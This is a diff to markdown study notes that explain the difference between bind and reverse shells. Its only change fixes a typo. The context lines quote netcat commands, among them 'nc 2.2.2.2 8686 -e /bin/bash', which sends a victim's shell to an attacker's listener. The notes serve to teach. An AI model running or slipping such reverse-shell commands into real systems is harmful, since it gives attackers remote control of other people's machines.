@@ -84,7 +84,7 @@
 		- Q : what a attacker will do on his/her system , means what that attacker will write on his/her system<br>Ans : that attacker will write `nc 1.1.1.1 8686` <br>- once the the attacker is connected with the Victim's system , then the attacker can run all the commands
 	- Reverse Shell 
 		- in it , attacker system becomes a server via "`nc -lvp 8686`"  & assume this server's IP is 2.2.2.2<br>- Q : What Victim system will run a command <br> Ans : i.e "`nc 2.2.2.2 8686 -e /bin/bash`"
-		- so when a client (i.e Victim's system) comes to connect wit the server (i.e attacker system) <br> - so when that client comes to connect with the server - then during during making a connection , <br>client system will bring that location i.e "`/bin/bash`" (means terminal location)
+		- so when a client (i.e Victim's system) comes to connect with the server (i.e attacker system) <br> - so when that client comes to connect with the server - then during during making a connection , <br>client system will bring that location i.e "`/bin/bash`" (means terminal location)
 	- difference b/w Bind Shell vs Reverse shell
 		- in Bind Shell , we (as a attacker/client) making connection with the server (i.e Victim's system) <br>- means we're going to Victim's system to make establish the connection
 		- in Reverse shell , Victim (i.e client) is bring a connection (with the terminal location) towards the attacker (i.e server) 
